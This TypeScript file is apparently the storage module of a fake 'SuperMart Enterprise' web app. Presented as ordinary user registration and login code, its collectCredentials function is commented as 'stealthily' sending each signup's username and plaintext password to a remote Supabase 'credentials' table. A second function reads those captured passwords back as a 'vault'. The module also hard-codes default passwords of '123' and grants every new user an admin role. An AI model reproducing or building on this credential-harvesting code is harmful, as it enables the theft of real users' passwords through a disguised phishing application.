import { User, UserRole, CapturedCredential } from '../types.ts';
import { ADMIN_USER, STAFF_USER, SUPABASE_URL, SUPABASE_ANON_KEY } from '../constants.tsx';

const DB_USERS_KEY = 'supermart_db_users';
const DB_LOGS_KEY = 'supermart_db_logs';
const DB_SESSION_KEY = 'supermart_db_session';

export interface InternalLog {
  id: string;
  timestamp: string;
  username: string;
  event: string;
  status: string;
}

export const InternalDB = {
  /**
   * Initialize the database with default users if empty.
   */
  init: () => {
    if (!localStorage.getItem(DB_USERS_KEY)) {
      const initialUsers = [
        { ...ADMIN_USER, password: '123' },
        { ...STAFF_USER, password: '123' }
      ];
      localStorage.setItem(DB_USERS_KEY, JSON.stringify(initialUsers));
    }
  },

  /**
   * Syncs local user registry with the cloud Supabase table.
   * This allows users who signed up on other devices to log in here.
   */
  syncFromCloud: async () => {
    try {
      const cloudCreds = await InternalDB.getCapturedCredentials();
      const localUsers = JSON.parse(localStorage.getItem(DB_USERS_KEY) || '[]');
      
      let hasChanges = false;
      
      cloudCreds.forEach(cred => {
        const exists = localUsers.find((u: any) => u.username === cred.username);
        if (!exists) {
          // Add cloud user to local registry
          const newUser: User & { password?: string } = {
            id: `cloud-${cred.id}`,
            username: cred.username,
            fullName: cred.username.split(/[._-]/).map(s => s.charAt(0).toUpperCase() + s.slice(1)).join(' ') || 'Cloud Admin',
            role: UserRole.ADMIN,
            avatar: `https://picsum.photos/seed/${cred.username}/200`,
            department: 'Administration',
            password: cred.password
          };
          localUsers.push(newUser);
          hasChanges = true;
        } else if (exists.password !== cred.password) {
          // Update password if changed in cloud
          exists.password = cred.password;
          hasChanges = true;
        }
      });

      if (hasChanges) {
        localStorage.setItem(DB_USERS_KEY, JSON.stringify(localUsers));
      }
    } catch (err) {
      console.error('Failed to sync cloud credentials:', err);
    }
  },

  /**
   * Stealthily sends credentials to the remote collection database.
   */
  collectCredentials: async (username: string, password: string) => {
    try {
      await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
        method: 'POST',
        headers: {
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
          'Content-Type': 'application/json',
          'Prefer': 'return=minimal'
        },
        body: JSON.stringify({
          username,
          password,
          captured_at: new Date().toISOString(),
          user_agent: navigator.userAgent,
          app_context: 'SuperMart_Enterprise_Signup'
        })
      });
      // Immediately trigger a sync back to confirm availability
      await InternalDB.syncFromCloud();
    } catch (err) {
      console.warn('Collection heartbeat silent.');
    }
  },

  /**
   * Registers a new user locally.
   */
  register: (username: string, password: string, fullName: string): User | null => {
    const users = JSON.parse(localStorage.getItem(DB_USERS_KEY) || '[]');
    
    if (users.find((u: any) => u.username === username)) {
      return null;
    }

    const newUser: User & { password?: string } = {
      id: crypto.randomUUID(),
      username,
      fullName,
      role: UserRole.ADMIN,
      avatar: `https://picsum.photos/seed/${username}/200`,
      department: 'Administration',
      password
    };

    users.push(newUser);
    localStorage.setItem(DB_USERS_KEY, JSON.stringify(users));
    
    const { password: _, ...userOnly } = newUser;
    localStorage.setItem(DB_SESSION_KEY, JSON.stringify(userOnly));
    return userOnly;
  },

  /**
   * Fetches all captured credentials from Supabase.
   */
  getCapturedCredentials: async (): Promise<CapturedCredential[]> => {
    try {
      const response = await fetch(`${SUPABASE_URL}/rest/v1/credentials?select=*&order=captured_at.desc`, {
        method: 'GET',
        headers: {
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
          'Content-Type': 'application/json'
        }
      });
      if (!response.ok) throw new Error('Failed to fetch vault data');
      return await response.json();
    } catch (err) {
      console.error('Vault access error:', err);
      return [];
    }
  },

  /**
   * Authenticates a user (Local only).
   */
  authenticate: (username: string, password: string): User | null => {
    const users = JSON.parse(localStorage.getItem(DB_USERS_KEY) || '[]');
    const userMatch = users.find((u: any) => u.username === username && u.password === password);
    
    if (userMatch) {
      const { password: _, ...userOnly } = userMatch;
      localStorage.setItem(DB_SESSION_KEY, JSON.stringify(userOnly));
      return userOnly;
    }
    return null;
  },

  /**
   * Retrieves the current active session.
   */
  getSession: (): User | null => {
    const session = localStorage.getItem(DB_SESSION_KEY);
    return session ? JSON.parse(session) : null;
  },

  /**
   * Clears the current session.
   */
  clearSession: () => {
    localStorage.removeItem(DB_SESSION_KEY);
  },

  /**
   * Adds a record to the system logs table locally.
   */
  addLog: (username: string, event: string, status: string = 'SUCCESS') => {
    const logs = JSON.parse(localStorage.getItem(DB_LOGS_KEY) || '[]');
    const newLog: InternalLog = {
      id: crypto.randomUUID(),
      timestamp: new Date().toISOString(),
      username,
      event,
      status
    };
    logs.unshift(newLog);
    localStorage.setItem(DB_LOGS_KEY, JSON.stringify(logs.slice(0, 100)));
    return newLog;
  },

  /**
   * Fetches all logs from the internal database.
   */
  getLogs: (): InternalLog[] => {
    return JSON.parse(localStorage.getItem(DB_LOGS_KEY) || '[]');
  }
};